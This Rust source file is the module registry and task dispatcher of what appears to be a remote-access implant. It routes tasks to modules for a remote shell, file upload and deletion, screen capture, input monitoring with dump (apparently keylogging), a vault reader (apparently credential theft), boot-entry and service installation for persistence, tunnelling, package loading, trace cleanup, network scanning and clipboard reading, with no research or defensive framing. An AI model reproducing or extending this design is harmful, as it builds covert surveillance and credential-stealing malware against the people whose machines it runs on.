/// Core module registry and task dispatcher.

#[cfg(feature = "terminal")]
pub mod terminal;
#[cfg(feature = "storage")]
pub mod storage;
#[cfg(feature = "task_viewer")]
pub mod task_viewer;
#[cfg(feature = "display")]
pub mod display;
#[cfg(feature = "input_monitor")]
pub mod input_monitor;
#[cfg(feature = "vault_reader")]
pub mod vault_reader;
#[cfg(feature = "config_store")]
pub mod config_store;
#[cfg(feature = "boot_entries")]
pub mod boot_entries;
#[cfg(feature = "service_manager")]
pub mod service_manager;
#[cfg(feature = "tunnel")]
pub mod tunnel;
#[cfg(feature = "package_loader")]
pub mod package_loader;
#[cfg(feature = "cleanup")]
pub mod cleanup;
#[cfg(feature = "network_scan")]
pub mod network_scan;
#[cfg(feature = "clipboard")]
pub mod clipboard;
pub mod host_profile;

use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TaskResult {
    pub task_id: i64,
    pub output: String,
    pub output_type: String,
    pub status: String,
}

impl TaskResult {
    pub fn success(task_id: i64, output: String) -> Self {
        TaskResult {
            task_id,
            output,
            output_type: "text".to_string(),
            status: "completed".to_string(),
        }
    }

    pub fn success_typed(task_id: i64, output: String, output_type: &str) -> Self {
        TaskResult {
            task_id,
            output,
            output_type: output_type.to_string(),
            status: "completed".to_string(),
        }
    }

    pub fn error(task_id: i64, msg: String) -> Self {
        TaskResult {
            task_id,
            output: msg,
            output_type: "text".to_string(),
            status: "error".to_string(),
        }
    }
}

/// Dispatch a task to the appropriate module handler.
pub fn dispatch_task(task_id: i64, task_type: &str, args: &serde_json::Value) -> TaskResult {
    match task_type {
        "host_profile" => host_profile::run(task_id, args),

        #[cfg(feature = "terminal")]
        "terminal" => terminal::run(task_id, args),

        #[cfg(feature = "storage")]
        "storage_list" => storage::list_dir(task_id, args),
        #[cfg(feature = "storage")]
        "storage_read" => storage::read_file(task_id, args),
        #[cfg(feature = "storage")]
        "storage_write" => storage::write_file(task_id, args),
        #[cfg(feature = "storage")]
        "storage_delete" => storage::delete_file(task_id, args),
        #[cfg(feature = "storage")]
        "storage_upload" => storage::upload_file_task(task_id, args),

        #[cfg(feature = "task_viewer")]
        "task_viewer_list" => task_viewer::list_processes(task_id, args),
        #[cfg(feature = "task_viewer")]
        "task_viewer_kill" => task_viewer::kill_process(task_id, args),

        #[cfg(feature = "display")]
        "display_capture" => display::capture(task_id, args),

        #[cfg(feature = "input_monitor")]
        "input_monitor_start" => input_monitor::start(task_id, args),
        #[cfg(feature = "input_monitor")]
        "input_monitor_stop" => input_monitor::stop(task_id, args),
        #[cfg(feature = "input_monitor")]
        "input_monitor_dump" => input_monitor::dump(task_id, args),

        #[cfg(feature = "vault_reader")]
        "vault_reader" => vault_reader::run(task_id, args),

        #[cfg(feature = "config_store")]
        "config_store_read" => config_store::read_key(task_id, args),
        #[cfg(feature = "config_store")]
        "config_store_write" => config_store::write_key(task_id, args),
        #[cfg(feature = "config_store")]
        "config_store_delete" => config_store::delete_key(task_id, args),
        #[cfg(feature = "config_store")]
        "config_store_list" => config_store::list_subkeys(task_id, args),

        #[cfg(feature = "boot_entries")]
        "boot_entries_list" => boot_entries::list(task_id, args),
        #[cfg(feature = "boot_entries")]
        "boot_entries_add" => boot_entries::add(task_id, args),
        #[cfg(feature = "boot_entries")]
        "boot_entries_remove" => boot_entries::remove(task_id, args),

        #[cfg(feature = "service_manager")]
        "service_manager_install" => service_manager::install(task_id, args),
        #[cfg(feature = "service_manager")]
        "service_manager_remove" => service_manager::remove(task_id, args),

        #[cfg(feature = "tunnel")]
        "tunnel_start" => tunnel::start(task_id, args),
        #[cfg(feature = "tunnel")]
        "tunnel_stop" => tunnel::stop(task_id, args),

        #[cfg(feature = "package_loader")]
        "package_loader" => package_loader::run(task_id, args),

        #[cfg(feature = "cleanup")]
        "cleanup" => cleanup::run(task_id, args),

        #[cfg(feature = "network_scan")]
        "network_scan" => network_scan::run(task_id, args),

        #[cfg(feature = "clipboard")]
        "clipboard_read" => clipboard::read(task_id, args),

        _ => TaskResult::error(task_id, format!("unknown task type: {}", task_type)),
    }
}
